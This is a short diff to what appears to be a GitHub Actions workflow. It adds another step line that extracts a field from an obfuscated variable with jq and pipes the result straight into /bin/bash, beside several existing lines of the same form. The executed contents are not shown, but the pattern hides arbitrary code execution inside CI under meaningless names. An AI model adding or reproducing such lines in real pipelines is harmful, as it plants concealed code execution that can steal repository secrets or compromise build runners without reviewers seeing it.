@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$o87786" | jq -r .t341 | /bin/bash
           printf '%s' "$oa9" | jq -r .u1 | /bin/bash
           echo $nff459 | jq -r .l54 | /bin/bash
+          echo $p5950 | jq -r .w8561 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
